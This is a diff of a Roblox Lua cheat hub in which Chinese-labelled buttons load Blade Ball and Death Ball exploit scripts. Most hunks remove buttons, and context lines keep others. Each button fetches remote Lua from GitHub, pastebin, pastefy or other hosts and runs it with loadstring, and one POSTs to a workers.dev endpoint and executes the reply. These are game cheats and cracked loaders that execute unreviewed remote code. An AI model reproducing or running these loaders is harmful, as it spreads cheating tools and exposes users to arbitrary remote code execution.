@@ -1594,103 +1594,6 @@ a:Button("星月刀刃球 V3",function()
 
 local a = creds:section("脚本",true)
 
-a:Button("tbaohub",function()
-local link = "https://raw.githubusercontent.com/tbao143/thaibao/refs/heads/main/TbaoHubBallBlade" loadstring(game:HttpGet(link))()
-end)
-
-a:Button("illyamarj-HUB",function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/illyamarj/HUB/main/bladeball.txt"))()
-end)
-
-a:Button("REDzHUB-2",function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/REDzHUB/BladeBall/main/redz9999"))()
-end)
-
-a:Button("Lumin-Hub-v2",function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/No6No6No7yt/Lumin-Hub/main/BladeV2.lua"))
-end)
-
-a:Button("RNG",function()
-loadstring(game:HttpGet("https://rawscripts.net/raw/RNG-AURA-Death-Ball-Mega-Auto-Parry-Esp-Dodge-11232"))()
-end)
-
-a:Button("alchemyhub",function()
-loadstring(game:HttpGet("https://alchemyhub.xyz/v2"))()
-end)
-
-a:Button("Lumin-Hub",function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/No6No6No7yt/Lumin-Hub/main/BladeV3.lua"))()
-end)
-
-a:Button("10336",function()
-loadstring(game:HttpGet("https://rawscripts.net/raw/Blade-Ball-Auto-Parry-10336"))()
-end)
-
-a:Button("y3MGGd9n",function()
-loadstring(game:HttpGet("https://pastefy.app/y3MGGd9n/raw"))()
-end)
-
-a:Button("VikiChard",function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/VikiChardd/Bb-script/main/Meow%20Source%20Hub"))()
-end)
-
-a:Button("Fuji",function()
-loadstring(game:HttpGet("https://shz.al/~Fujibladeball"))()
-end)
-
-a:Button("Next1x",function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Next1x/Bedol/main/Hub"))()
-end)
-
-a:Button("mqGPg69N",function()
-loadstring(game:HttpGet("https://pastebin.com/raw/mqGPg69N"))()
-end)
-
-a:Button("romkich09",function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/romkich09/stire/main/starballkey", true))()
-end)
-
-a:Button("Codex-Hub",function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/bosterdrone/bladeball/main/Codex-Hub"))()
-end)
-
-a:Button("HeavenHub",function()
-loadstring(Game:HttpGet("https://raw.githubusercontent.com/Peessst/Heavenhub/main/HeavenHubBlade"))()
-end)
-
-a:Button("8968",function()
-local link = "https://raw.githubusercontent.com/tangxianchun/550fx/main/daorenqiu1.lua"
-loadstring(game:HttpGet(link))()
-end)
-
-a:Button("Corolla",function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/7190000/Corolla-Hub/main/ch.lua"))()
-end)
-
-a:Button("nqxl0fc",function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/nqxlOfc/Loaders/main/Blade_Ball.lua"))()
-end)
-
-a:Button("sira",function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/sirapobsriumang/Blade-ball/main/Blade-ball-free"))()
-end)
-
-a:Button("NoHaxV3",function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/r4mpage4/NoHaxV3/main/BladeBallNoHax%20V3"))();
-end)
-
-a:Button("Zzz",function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ZzzScript/SpectacularHubScript/main/BladeBall"))()
-end)
-
-a:Button("Sirius",function()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/xdevslasher/Siriusisbetter/main/xyz.bb.lua",true))()
- end)
-
- a:Button("DenDenZYT KEY-VIOLAFOUNTAIN",function()
-  loadstring(game:HttpGet("https://raw.githubusercontent.com/DenDenZYT/Main/main/FreeAtreusHubKeySystem"))()
- end)
-  
  a:Button("SymphonyHub『需密钥』",function()
 local a,b,c,d=loadstring,request or http_request or(http and http.request)or(syn and syn.request),assert,"https://lhr.synteamenv.workers.dev/?page=script"c(a and b,"Your executor does not support.")a(b({Url=d,Method="POST",Headers={["Authorization"]="Elf and Tears"}}).Body)()
  end) 
@@ -1726,11 +1629,8 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/1f0yt/community/main/
     loadstring(game:HttpGet("https://raw.githubusercontent.com/OopssSorry/luax-crack/main/loader.lua"))()
  end) 
  
- a:Button("nexus",function() 
+ a:Button("nexus",function()
      loadstring(game:HttpGet("https://raw.githubusercontent.com/s-o-a-b/nexus/main/loadstring"))()
- end) 
- a:Button("free-fuji『密钥：FreeFuji』",function() 
-     loadstring(game:HttpGet("https://shz.al/~free-fuji-v2"))()
  end) 
  
  a:Button("Hosvile『主』",function() 
@@ -1762,20 +1662,6 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/Hosvile/Refinement/ma
 local link = "https://raw.githubusercontent.com/tangxianchun/550fx/main/autospam.lua"
 loadstring(game:HttpGet(link))()
  end) 
-
-a:Button("ThatSick『密钥：INDISCORD』",function()
- script_key=""; -- Put your key here if you have VIP
-loadstring(game:HttpGet("https://raw.githubusercontent.com/ThatSick/HighlightMM2/main/Main"))()
-end)
-
-a:Button("Bedol-Hub-beta",function()
-  
-loadstring(game:HttpGet("https://raw.githubusercontent.com/sirapobsriumang/Bedol-Hub-beta/main/Bladeball"))()
- end)
-
-a:Button("ffji",function()
-loadstring(game:HttpGet("https://raw.githubusercontent.com/FFJ1/Roblox-Exploits/main/scripts/autoparry.lua"))()
-end)
 
 local creds = window:Tab("死亡球",'6035145364')
 
